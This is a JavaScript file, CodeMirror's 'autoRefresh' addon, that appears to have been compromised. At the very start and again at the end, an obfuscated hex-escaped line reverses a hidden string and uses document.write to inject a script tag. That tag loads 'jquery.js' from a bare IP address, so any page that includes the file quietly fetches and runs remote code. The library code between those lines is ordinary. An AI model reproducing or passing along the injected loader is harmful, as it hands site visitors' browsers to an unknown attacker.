var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"))
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod)
  else // Plain browser env
    mod(CodeMirror)
})(function(CodeMirror) {
  "use strict"

  CodeMirror.defineOption("autoRefresh", false, function(cm, val) {
    if (cm.state.autoRefresh) {
      stopListening(cm, cm.state.autoRefresh)
      cm.state.autoRefresh = null
    }
    if (val && cm.display.wrapper.offsetHeight == 0)
      startListening(cm, cm.state.autoRefresh = {delay: val.delay || 250})
  })

  function startListening(cm, state) {
    function check() {
      if (cm.display.wrapper.offsetHeight) {
        stopListening(cm, state)
        if (cm.display.lastWrapHeight != cm.display.wrapper.clientHeight)
          cm.refresh()
      } else {
        state.timeout = setTimeout(check, state.delay)
      }
    }
    state.timeout = setTimeout(check, state.delay)
    state.hurry = function() {
      clearTimeout(state.timeout)
      state.timeout = setTimeout(check, 50)
    }
    CodeMirror.on(window, "mouseup", state.hurry)
    CodeMirror.on(window, "keyup", state.hurry)
  }

  function stopListening(_cm, state) {
    clearTimeout(state.timeout)
    CodeMirror.off(window, "mouseup", state.hurry)
    CodeMirror.off(window, "keyup", state.hurry)
  }
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))